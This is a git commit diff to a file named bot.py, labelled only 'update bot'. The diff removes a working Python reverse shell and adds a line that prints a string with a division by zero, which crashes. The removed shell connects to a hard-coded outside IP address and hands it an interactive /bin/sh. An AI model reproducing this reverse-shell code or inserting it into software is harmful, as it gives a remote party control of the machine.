515dabb9ab288b288ec5f5918fb63c0689c16bac
SoftwareSecuredOperations <159371968+SoftwareSecuredOperations@users.noreply.github.com>
2024-09-09 10:14:00 -0400

    update bot

--- bot.py
+++ bot.py
@@ -1,9 +1,5 @@
 import socket,subprocess,os
 
 def run(ctx):
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("23.22.233.22",80))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    subprocess.call(["/bin/sh","-i"])
+    x = 'hi there'
+    print(f"{x}, {0/0}")
